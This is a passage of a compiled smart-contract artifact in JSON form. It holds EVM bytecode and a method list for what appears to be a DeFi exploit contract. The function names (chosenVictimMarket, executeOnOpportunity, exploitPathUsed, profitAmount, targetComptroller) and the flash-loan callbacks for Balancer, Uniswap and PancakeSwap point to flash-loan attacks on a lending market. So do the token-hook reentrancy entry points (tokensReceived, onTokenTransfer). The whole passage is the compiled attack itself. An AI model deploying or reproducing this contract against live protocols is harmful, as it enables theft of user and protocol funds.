73a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48602084015273dac17f958d2ee523a2206206994597c13d831ec783830152736b175474e89094c44da98b954eedeac495271d0f6060840152732260fac5e5542a773aa44fbcfedf7c193bc2c59960808401525f5b6002811061348f5750505050565b5f5b6005811061353d57506134bc6134aa610ede838561338e565b6002546001600160a01b031690613f39565b6001600160a01b03811615613534576002546134e2906001600160a01b03165b82614253565b908589015182116134fb575b5050506001905b01613481565b60019398506135279061351e61350f61084c565b6001600160a01b039095168552565b15156020840152565b8482015295905f806134ee565b506001906134f5565b61356c61354d610ede848661338e565b6002546001600160a01b0316613566610ede858a61339f565b9161405d565b6001600160a01b038116156135ca57600254613590906001600160a01b03166134dc565b90868a015182116135a9575b5050506001905b01613491565b60019399506135bd9061351e61350f61084c565b8582015296905f8061359c565b506001906135a3565b6103e88102908082046103e81490151715610e66576103e5900460018101809111610e665790565b600b5460a081901c60ff169081156136e157600c54915b156136c8575f9061362d9061018f906001600160a01b031681565b91823b156101ac5760405163022c0d9f60e01b8152600481019190915260248101919091523060448201526080606482015260016084820152600160f81b60a4820152905f90829060c490829084905af190816136ae575b5061368e575f90565b600854602081901c60ff1690816136a3575090565b60301c60ff16905090565b806136bc5f6136c29361062e565b80610259565b5f613685565b61362d61018f61018f600c54936001600160a01b031690565b5f91613612565b90602080835192838152019201905f5b8181106137055750505090565b82516001600160a01b03168452602093840193909201916001016136f8565b9392916137469160018060a01b031685526080602086015260808501906136e8565b9280840360408201526020808351958681520192015f945b80861061377b575050602092935060608183039101525f81520190565b9092602080600192865181520194019501949061375e565b604051906137a260408361062e565b601c82527f42414c414e4345525f424f52524f575f464c4153485f4641494c4544000000006020830152565b604051906137dd60408361062e565b601c82527f42414c414e4345525f52454445454d5f464c4153485f4641494c4544000000006020830152565b6138116131fd565b60025461382a906001600160a01b03166132eb83610dca565b6138326131fd565b9161383c83610dca565b5273ba12222222228d8ba445958a75a0704d566bf2c83b156101ac57604051632e1c224f60e11b8152915f918391829161387b91903060048501613724565b03818373ba12222222228d8ba445958a75a0704d566bf2c85af190816138d1575b506130615760085460019060101c60ff166138b681611a4a565b036138c6576116c5610cae6137ce565b6116c5610cae613793565b806136bc5f6138df9361062e565b5f61389c565b6138fb5f5160206145c05f395f51905f52612a8b565b6001600160a01b0381161580156139bc575b61282657815f5160206145c05f395f51905f52613929926143f0565b6040516319fda3eb60e21b6020820152602481018290526001604482015261396290612f7881606481015b03601f19810183528261062e565b90811561398c575b50156116c5576139865f5160206145c05f395f51905f52613c25565b50600190565b60405163140e25ad60e31b602082015260248101919091526139b69150612f788160448101613954565b5f61396a565b50811561390d565b906139ce82612a8b565b6001600160a01b038116158015613a78575b613a715781836139ef926143f0565b6040516319fda3eb60e21b60208201526024810182905260016044820152613a2490613a1e8160648101613954565b83613d01565b908115613a3b575b50156127d45761398690613c25565b60405163140e25ad60e31b60208201526024810191909152613a6b9150613a658160448101613954565b82613d01565b5f613a2c565b5050505f90565b5081156139e0565b15613a8757565b60405162461bcd60e51b815260206004820152601060248201526f544f4b454e5f43414c4c5f46414c534560801b6044820152606490fd5b5f91829182602083519301915af1613ad5611217565b9015613b0857805180613ae6575050565b81602091810103126101ac576020015180151581036101ac5761085b90613a80565b60405162461bcd60e51b81526020600482015260116024820152701513d2d15397d0d0531317d19052531151607a1b6044820152606490fd5b5f806040516020810190631d8e90d160e11b825260048152612ef760248261062e565b5f80916040516020810190631d8e90d160e11b8252600481526127a860248261062e565b80156127d457611785906040519063317afabb60e21b6020830152602482015260248152612f7860448261062e565b90801561282657611785916040519163317afabb60e21b6020840152602483015260248252613be760448361062e565b613d01565b90613c046020919493946040845260408401906136e8565b6001600160a01b03909416910152565b9060206117859281815201906136e8565b6001600160a01b038116156127d457613c3d81612c99565b6001600160a01b03811615613cef575b6001600160a01b0381161561282657613c71613c676131fd565b926132eb84610dca565b613cae5f80604051602081019063effd86f560e01b8252613c9a81613954308a60248401613bec565b519082865af1613ca8611217565b90614501565b613ce8575f80916117859382604051613cdc816139546020820195631853304760e31b875260248301613c14565b51925af1613ca8611217565b5050600190565b506003546001600160a01b0316613c4d565b5f91829182602083519301915af1613d17611217565b90156127d4578051908115613ce857602082106128265760208061161d93830101910161274c565b6020818303126101ac578051906001600160401b0382116101ac57019080601f830112156101ac578151613d728161086b565b92613d80604051948561062e565b81845260208085019260051b8201019283116101ac57602001905b828210613da85750505090565b602080918351613db78161019b565b815201910190613d9b565b6003546001600160a01b03168015613e24575f8091604051602081019063b0772d0b60e01b825260048152613df860248261062e565b51915afa613e04611217565b90158015613e2d575b613e24578060208061178593518301019101613d3f565b5061178561321f565b50805115613e0d565b60405190613e4560a08361062e565b60048252613e53600461086b565b602083019290601f19013684378092815115610dd75773e853e5c1edf8c51e81bae81d742dd861df596de79052805160011015610dd75773f7548a6e9daf2e4689cedd8a08189d0d6f3ee91b6040820152805160021015610dd757613eda81613ed5606061085b940173104079a87ce46fe2cf27b811f6b406b69f6872b39052565b610ddc565b5f5160206145c05f395f51905f529052565b90916001600160a01b0316908115613f31575f5b838110613f0f57505050505f90565b826001600160a01b03613f228385610dec565b5116146131d557600101613f00565b505050600190565b6001600160a01b03811615801561404c575b61282657613f5761327a565b915f5b835181101561404457613f78613f73610ede8387610dec565b612a8b565b6001600160a01b0381168015908115614031575b5061401d5760405163e6a4390560e01b602082019081526001600160a01b03808616602484015290921660448201525f918291613fcc8160648101613954565b5190865afa613fd9611217565b90158015614026575b61401d5761018f81602080613ffc94518301019101612a76565b6001600160a01b03811661401557506001905b01613f5a565b935050505090565b5060019061400f565b506020815110613fe2565b6001600160a01b0385161490505f613f8c565b505050505f90565b506001600160a01b03821615613f4b565b90916001600160a01b0382161580156141f8575b613a71576001600160a01b03811661416d575b5061408d61327a565b915f5b8351811015614044576140a9613f73610ede8387610dec565b6001600160a01b038116801590811561415a575b506141465760405163e6a4390560e01b602082019081526001600160a01b03808616602484015290921660448201525f9182916140fd8160648101613954565b5190865afa61410a611217565b9015801561414f575b6141465761018f8160208061412d94518301019101612a76565b6001600160a01b03811661401557506001905b01614090565b50600190614140565b506020815110614113565b6001600160a01b0385161490505f6140bd565b60405163e6a4390560e01b602082019081526001600160a01b03808616602484015290921660448201525f9182916141a88160648101613954565b5190845afa6141b5611217565b90806141ec575b156140845761018f816020806141d794518301019101612a76565b6001600160a01b038116156140845791505090565b506020815110156141bc565b506001600160a01b03831615614071565b51906001600160701b03821682036101ac57565b908160609103126101ac5761423181614209565b91604061424060208401614209565b92015163ffffffff811681036101ac5790565b6001600160a01b038116156143e8575f806040516020810190630dfe168160e01b82526004815261428560248261062e565b5190845afa614292611217565b5f80604051602081019063d21220a760e01b8252600481526142b560248261062e565b5190865afa5f806142c4611217565b956040516020810190630240bc6b60e21b8252600481526142e660248261062e565b51915afa6142f2611217565b93159182156143df575b5081156143d6575b5080156143cb575b80156143c0575b80156143b5575b6143ab5761434d61018f61433d61018f8460208061435d97518301019101612a76565b9460208082518301019101612a76565b916020808251830101910161421d565b50936001600160a01b039081169316831461439757506001600160a01b03161461438857505f905f90565b906001600160701b035f921690565b93925050506001600160701b036001921690565b505050505f905f90565b50606082511061431a565b506020835110614313565b50602081511061430c565b9050155f614304565b1591505f6142fc565b50505f905f90565b604051636eb1769f60e11b602082019081523060248301526001600160a01b03841660448301529193915f918291829161442d8160648101613954565b5190875afa61443a611217565b90806144f5575b6144db575b5010156144d75760405163095ea7b360e01b60208201526001600160a01b03821660248201525f604482015261085b926144c992909161270c9190614498906144928160648101613954565b84613abf565b60405163095ea7b360e01b60208201526001600160a01b0390911660248201525f1960448201529283906064820190565b03601f19810184528361062e565b5050565b6144ef91506020808251830101910161274c565b5f614446565b50602081511015614441565b1580156145b6575b6127d457602080825183010191016020818303126101ac578051906001600160401b0382116101ac57019080601f830112156101ac57815161454a8161086b565b92614558604051948561062e565b81845260208085019260051b8201019283116101ac57602001905b8282106145a6575050508051156127d4575f5b8151811015613ce8576145998183610dec565b5161282657600101614586565b8151815260209182019101614573565b5080511561450956fe000000000000000000000000b0f8fe96b4880adbdede0ddf446bd1e7ef122c4ea2646970667358221220433dbfb9f453bed596e9e91801f5b90f150dbe473d292b956586bf45ec8a916f64736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"BALANCER_VAULT()":"bc163846","ERC1820_REGISTRY()":"013eb177","SUSHISWAP_FACTORY()":"495c0f9b","TARGET_MARKET()":"c86bc7fd","UNISWAP_V2_FACTORY()":"99d8fae3","chosenVictimMarket()":"eeb3b5e3","chosenVictimUnderlying()":"6de4d1eb","executeOnOpportunity()":"3c2448ed","executed()":"31a38c89","exploitPathUsed()":"d78c4281","hypothesisValidated()":"463defd1","lastFailure()":"c3a5a154","onTokenTransfer(address,uint256,bytes)":"a4c0ed36","onTransferReceived(address,address,uint256,bytes)":"88a7ca5c","pancakeCall(address,uint256,uint256,bytes)":"84800812","profitAmount()":"5ff972cc","profitToken()":"49343624","receiveFlashLoan(address[],uint256[],uint256[],bytes)":"f04f2707","targetComptroller()":"74bbd9ed","targetUnderlying()":"fa0eea31","tokenFallback(address,uint256,bytes)":"c0ee0b8a","tokensReceived(address,address,address,uint256,bytes,bytes)":"0023de29","uniswapV2Call(address,uint256,uint256,bytes)":"10d1e85c"},"id":0}